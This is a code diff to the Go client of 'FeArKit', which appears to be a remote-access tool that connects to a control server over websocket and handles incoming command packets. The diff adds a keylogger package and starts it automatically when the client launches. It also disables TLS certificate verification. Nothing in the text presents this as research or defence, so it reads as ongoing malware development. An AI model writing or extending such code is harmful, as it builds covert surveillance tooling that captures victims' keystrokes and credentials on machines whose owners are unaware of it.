@@ -3,6 +3,7 @@ package core
 import (
 	"FeArKit/client/common"
 	"FeArKit/client/config"
+	"FeArKit/client/service/keylogger"
 	"FeArKit/modules"
 	"FeArKit/utils"
 	"encoding/hex"
@@ -13,6 +14,7 @@ import (
 	"runtime"
 	"strings"
 	"time"
+	"crypto/tls"
 
 	ws "github.com/gorilla/websocket"
 	"github.com/kataras/golog"
@@ -51,6 +53,7 @@ func Start() {
 		}
 
 		checkUpdate(common.WSConn)
+		keylogger.StartKeylogger()
 
 		err = handleWS(common.WSConn)
 		if err != nil && !stop {
@@ -62,13 +65,17 @@ func Start() {
 }
 
 func connectWS() (*common.Conn, error) {
+
+	ws.DefaultDialer.TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
 	wsConn, wsResp, err := ws.DefaultDialer.Dial(config.GetBaseURL(true)+`/ws`, http.Header{
+		`User-Agent`: []string{`FeArKit Client`},
 		`UUID`: []string{config.Config.UUID},
 		`Key`:  []string{config.Config.Key},
 	})
 	if err != nil {
 		return nil, err
 	}
+	golog.Debugf("wsresp status: %d, headers: %v", wsResp.StatusCode, wsResp.Header)
 	header, find := wsResp.Header[`Secret`]
 	if !find || len(header) == 0 {
 		return nil, errNoSecretHeader
@@ -77,6 +84,7 @@ func connectWS() (*common.Conn, error) {
 	if err != nil {
 		return nil, err
 	}
+
 	return common.CreateConn(wsConn, secret), nil
 }
 
@@ -184,6 +192,7 @@ func handleWS(wsConn *common.Conn) error {
 		}
 		pack := modules.Packet{}
 		utils.JSON.Unmarshal(data, &pack)
+		//golog.Debugf("incoming pack: %+v", pack)
 		if err != nil {
 			golog.Error(err)
 			errCount++
